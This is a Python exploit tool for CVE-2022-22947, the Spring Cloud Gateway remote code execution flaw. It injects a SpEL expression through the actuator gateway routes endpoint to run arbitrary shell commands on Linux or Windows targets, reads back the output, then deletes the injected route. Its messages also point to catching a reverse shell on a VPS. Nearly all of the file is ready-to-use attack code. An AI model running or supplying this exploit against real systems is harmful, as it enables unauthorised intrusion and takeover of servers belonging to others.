import re,sys,argparse
from colorama import Fore,init
from urllib.parse import urlparse
import requests


def title():
    print(Fore.YELLOW + """
   ___             __         ____    ___   ____   ____          ____   ____    ___   _  _    _____ 
  / __\ /\   /\   /__\       |___ \  / _ \ |___ \ |___ \        |___ \ |___ \  / _ \ | || |  |___  |
 / /    \ \ / /  /_\   _____   __) || | | |  __) |  __) | _____   __) |  __) || (_) || || |_    / / 
/ /___   \ V /  //__  |_____| / __/ | |_| | / __/  / __/ |_____| / __/  / __/  \__, ||__   _|  / /  
\____/    \_/   \__/         |_____| \___/ |_____||_____|       |_____||_____|   /_/    |_|   /_/   
                                                                                                    
""")
    print(Fore.YELLOW + '\t\t\t\t\tCVE-2022-22947 Spring Cloud Gateway RCE\r\n' + '\t\t\t\t\t\t\t\t  ' + Fore.LIGHTBLUE_EX + 'By:K3rwin')  


def get_args():
    parser = argparse.ArgumentParser(description="Spring Cloud Gateway RCE 帮助指南")
    parser.add_argument("-u", "--url", dest="url", type=str, help="指定url")
    parser.add_argument("-c", "--cmd", dest="cmd", type=str, help="指定执行的命令,默认执行whoami", default='whoami')
    parser.add_argument("-s", "--system", dest="system", type=str, help="指定目标主机操作系统,默认linux,参数为win/linux", default='linux')
    args = parser.parse_args()
    url = args.url
    cmd = args.cmd
    system = args.system
    if url:
        url = urlparse(url)
        url = url.scheme + '://' + url.netloc
    return url,cmd,system


def exp(url, cmd, system):
    UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0)"}
    payload_linux = {
    "id": "k",
    "filters": [{
        "name": "AddResponseHeader",
        "args": {
        "name": "Result",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','%s'}).getInputStream()))}" % (cmd)
        }
    }],
    "uri": "http://baidu.com"
    }
    payload_win = {
    "id": "k",
    "filters": [{
        "name": "AddResponseHeader",
        "args": {
        "name": "Result",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'cmd','/c','%s'}).getInputStream()))}" % (cmd)
        }
    }],
    "uri": "http://baidu.com"
    }
    
    try:
        if system == "linux":
            add = requests.post(url=url + '/actuator/gateway/routes/k', headers=UA, json=payload_linux, timeout=5)
        else:
            add = requests.post(url=url + '/actuator/gateway/routes/k', headers=UA, json=payload_win, timeout=5)
        refresh = requests.post(url = url + '/actuator/gateway/refresh', headers=UA, timeout=5)
        res = requests.get(url = url + '/actuator/gateway/routes/k', headers=UA, timeout=5)
        dele = requests.delete(url = url + '/actuator/gateway/routes/k', headers=UA, timeout=5)
        refresh2 = requests.post(url = url + '/actuator/gateway/refresh', headers=UA, timeout=5)
        result_raw = res.text
        result = "shell 已终止"
        result = str(re.findall(r'\'(.*)\\n\']', result_raw)[0]).replace('\\n','\n')
    except Exception as e:
        result = ""
        #print("程序出错：%s"% e)
    return result


if __name__=="__main__":
    if len(sys.argv) > 1:
        init(autoreset=True)
        title()
        url,cmd,system = get_args()
        result = exp(url,cmd,system)
        if result:
            print(Fore.YELLOW + '[+]命令执行成功，执行结果如下:' + Fore.GREEN + '\r\n%s' % result)
        elif ("bash" in cmd) or ("powershell" in cmd):
            print(Fore.BLUE + "Vps上查看反弹shell")
        else:    
            print(Fore.RED + "[-]命令执行失败，漏洞利用失败!")
    else:
        print("使用python3 spring-cloud-gateway-rce.py -h 查看帮助")